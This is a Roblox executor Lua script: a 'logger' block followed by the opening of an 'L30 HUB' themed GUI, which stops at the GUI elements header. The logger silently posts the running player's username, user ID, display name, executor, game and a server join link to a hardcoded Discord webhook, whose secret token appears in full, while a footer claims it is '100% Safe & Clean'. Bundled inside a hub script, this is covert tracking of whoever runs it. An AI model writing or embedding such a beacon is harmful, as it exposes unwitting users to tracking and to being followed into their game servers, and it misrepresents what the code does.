-- FINAL SAFE & SICK 2025 LOGGER (rainbow + join link + custom pfp)
local Webhook = "https://discord.com/api/webhooks/1449056735334760620/gqO2kFEHPOe_rF0QyP5lj6rhbVX9KColi4izUAPe69gdDiokseQECFcisQgYiMy9BOzS"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local PlaceId = game.PlaceId
local JobId = game.JobId

local PlaceName = "Unknown Game"
pcall(function() PlaceName = game:GetService("MarketplaceService"):GetProductInfo(PlaceId).Name end)

local FullAvatar = "https://www.roblox.com/avatar-thumbnail/image?userId="..Player.UserId.."&width=720&height=720&format=png"
local colors = {0xff0000, 0xff7f00, 0xffff00, 0x00ff00, 0x0000ff, 0x8b00ff, 0xff1493, 0x9400d3}
local color = colors[math.random(1,#colors)]

local Executor = identifyexecutor and identifyexecutor() or (syn and "Synapse X" or Krnl and "Krnl" or fluxus and "Fluxus" or "Unknown")

local JoinText = JobId ~= "" and "[Join Server](https://www.roblox.com/games/"..PlaceId.."/?gameInstanceId="..JobId..")" or "*Private Server*"

local Payload = {
    username = "Executor Logger",
    avatar_url = "https://i.imgur.com/2WX57OQ.png",  -- your girl + boo pfp
    embeds = {{
        title = "Script Injected",
        description = ("**%s** just executed!"):format(Player.DisplayName ~= Player.Name and Player.DisplayName.." (@"..Player.Name..")" or Player.Name),
        color = color,
        thumbnail = {url = FullAvatar},
        image = {url = FullAvatar},
        fields = {
            {name = "Executor", value = "```"..Executor.."```", inline = false},
            {name = "Account", value = Player.Name.." | "..Player.DisplayName, inline = false},
            {name = "User ID", value = "```"..Player.UserId.."```", inline = true},
            {name = "Game", value = "**"..PlaceName.."**", inline = false},
            {name = "Join Link", value = JoinText, inline = false},
        },
        timestamp = DateTime.now():ToIsoDate(),
        footer = {text = "Rainbow Premium Logger • 100% Safe & Clean"}
    }}
}

local request = syn and syn.request or http and http.request or request or http_request or fluxus and fluxus.request
request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(Payload)})

print("sent – clean & beautiful")



--// L30 HUB 2026 - SMOOTH THEME TRANSITIONS + PFP + ANIMATED WELCOME + SEARCH //--

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local pgui = player:WaitForChild("PlayerGui")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "L30Hub"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = pgui

-- === 6 PREMIUM THEMES ===
local CurrentTheme = 1
local Themes = {
    {name="Purple Nebula", main=Color3.fromRGB(15,10,35), accent=Color3.fromRGB(170,100,255), glow=Color3.fromRGB(160,80,255), btn=Color3.fromRGB(40,25,90), btnhover=Color3.fromRGB(140,80,255)},
    {name="Cyber Pink",    main=Color3.fromRGB(35,10,35), accent=Color3.fromRGB(255,80,200), glow=Color3.fromRGB(255,100,220), btn=Color3.fromRGB(90,20,90), btnhover=Color3.fromRGB(255,100,220)},
    {name="Matrix Green",  main=Color3.fromRGB(0,25,15),  accent=Color3.fromRGB(0,255,150),  glow=Color3.fromRGB(0,255,120),  btn=Color3.fromRGB(0,70,40),   btnhover=Color3.fromRGB(0,255,150)},
    {name="Blood Red",     main=Color3.fromRGB(40,10,10), accent=Color3.fromRGB(255,60,60),  glow=Color3.fromRGB(255,80,80),  btn=Color3.fromRGB(100,20,20), btnhover=Color3.fromRGB(255,80,80)},
    {name="Ice Blue",      main=Color3.fromRGB(10,30,50), accent=Color3.fromRGB(80,200,255), glow=Color3.fromRGB(100,220,255),btn=Color3.fromRGB(20,70,110), btnhover=Color3.fromRGB(100,220,255)},
    {name="Gold Luxury",   main=Color3.fromRGB(45,40,15), accent=Color3.fromRGB(255,200,80), glow=Color3.fromRGB(255,220,100),btn=Color3.fromRGB(110,90,20), btnhover=Color3.fromRGB(255,220,100)}
}

local function GetTheme()
    return Themes[CurrentTheme]
end

-- === GUI ELEMENTS ===
